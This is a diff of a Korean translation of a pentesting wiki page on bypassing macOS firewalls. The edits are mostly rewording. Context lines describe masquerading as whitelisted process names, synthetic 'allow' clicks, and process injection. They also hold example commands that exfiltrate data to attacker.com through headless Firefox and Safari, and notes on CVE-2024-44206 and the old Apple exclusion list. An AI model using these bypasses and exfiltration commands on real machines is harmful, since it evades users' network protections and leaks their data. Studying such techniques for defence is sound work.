@@ -4,15 +4,15 @@
 
 ## 발견된 기술
 
-다음 기술들은 일부 macOS 방화벽 앱에서 작동하는 것으로 확인되었습니다.
+다음 기술은 일부 macOS 방화벽 앱에서 작동하는 것으로 확인되었습니다.
 
 ### 화이트리스트 이름 악용
 
-- 예를 들어, **`launchd`**와 같은 잘 알려진 macOS 프로세스의 이름으로 악성 코드를 호출하기
+- 예를 들어 **`launchd`**와 같은 잘 알려진 macOS 프로세스의 이름으로 악성 코드를 호출하기
 
 ### 합성 클릭
 
-- 방화벽이 사용자에게 권한을 요청하면 악성 코드가 **허용 클릭**을 하도록 만들기
+- 방화벽이 사용자에게 권한을 요청하면 악성 코드가 **허용 클릭**을 하도록 하기
 
 ### **Apple 서명 이진 파일 사용**
 
@@ -61,9 +61,10 @@ firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
 ```bash
 open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
 ```
-### 프로세스 주입을 통한 우회
+### 프로세스 주입을 통한 방법
 
 서버에 연결할 수 있는 프로세스에 **코드를 주입**할 수 있다면 방화벽 보호를 우회할 수 있습니다:
+
 
 {{#ref}}
 macos-proces-abuse/
@@ -74,8 +75,8 @@ macos-proces-abuse/
 ## 최근 macOS 방화벽 우회 취약점 (2023-2025)
 
 ### 웹 콘텐츠 필터 (스크린 타임) 우회 – **CVE-2024-44206**
-2024년 7월, Apple은 스크린 타임 부모 통제에서 사용되는 시스템 전체 “웹 콘텐츠 필터”를 망가뜨린 치명적인 버그를 Safari/WebKit에서 패치했습니다.
-특별히 제작된 URI(예: 이중 URL 인코딩된 “://”)는 스크린 타임 ACL에서 인식되지 않지만 WebKit에서는 수용되므로 요청이 필터링되지 않고 전송됩니다. 따라서 URL을 열 수 있는 모든 프로세스(샌드박스화된 코드 또는 서명되지 않은 코드 포함)는 사용자가 명시적으로 차단한 도메인이나 MDM 프로필에 도달할 수 있습니다.
+2024년 7월, Apple은 스크린 타임 부모 통제에서 사용되는 시스템 전체 “웹 콘텐츠 필터”를 망가뜨린 심각한 버그를 Safari/WebKit에서 패치했습니다.
+특별히 제작된 URI(예: 이중 URL 인코딩된 “://”)는 스크린 타임 ACL에 의해 인식되지 않지만 WebKit에 의해 수용되므로 요청이 필터링되지 않고 전송됩니다. 따라서 URL을 열 수 있는 모든 프로세스(샌드박스화된 코드나 서명되지 않은 코드 포함)는 사용자나 MDM 프로필에 의해 명시적으로 차단된 도메인에 도달할 수 있습니다.
 
 실용적인 테스트 (패치되지 않은 시스템):
 ```bash
@@ -92,7 +93,7 @@ pfctl -sr | grep quick       # rules are present…
 sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
 ```
 ### Apple 서명 헬퍼 서비스 악용 (구형 – macOS 11.2 이전)
-macOS 11.2 이전에 **`ContentFilterExclusionList`**는 **`nsurlsessiond`**와 App Store와 같은 약 50개의 Apple 바이너리가 Network Extension 프레임워크로 구현된 모든 소켓 필터 방화벽(LuLu, Little Snitch 등)을 우회할 수 있도록 허용했습니다. 
+macOS 11.2 이전에 **`ContentFilterExclusionList`**는 **`nsurlsessiond`**와 App Store와 같은 약 50개의 Apple 바이너리가 Network Extension 프레임워크(LuLu, Little Snitch 등)로 구현된 모든 소켓 필터 방화벽을 우회할 수 있도록 허용했습니다. 
 악성 소프트웨어는 단순히 제외된 프로세스를 생성하거나 그 안에 코드를 주입하여 이미 허용된 소켓을 통해 자신의 트래픽을 터널링할 수 있었습니다. Apple은 macOS 11.2에서 제외 목록을 완전히 제거했지만, 이 기술은 업그레이드할 수 없는 시스템에서 여전히 유효합니다.
 
 예시 개념 증명 (11.2 이전):
@@ -117,10 +118,10 @@ sudo pfctl -a com.apple/250.ApplicationFirewall -sr
 codesign -d --entitlements :- /path/to/bin 2>/dev/null \
 | plutil -extract com.apple.security.network.client xml1 -o - -
 ```
-3. Objective-C/Swift에서 자신의 네트워크 확장 콘텐츠 필터를 프로그래밍 방식으로 등록합니다.
+3. Objective-C/Swift에서 프로그램적으로 자신의 네트워크 확장 콘텐츠 필터 등록.
 패킷을 로컬 소켓으로 전달하는 최소한의 루트리스 PoC는 Patrick Wardle의 **LuLu** 소스 코드에서 사용할 수 있습니다.
 
-## 참고 문헌
+## 참고문헌
 
 - [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)
 - <https://nosebeard.co/advisories/nbl-001.html>
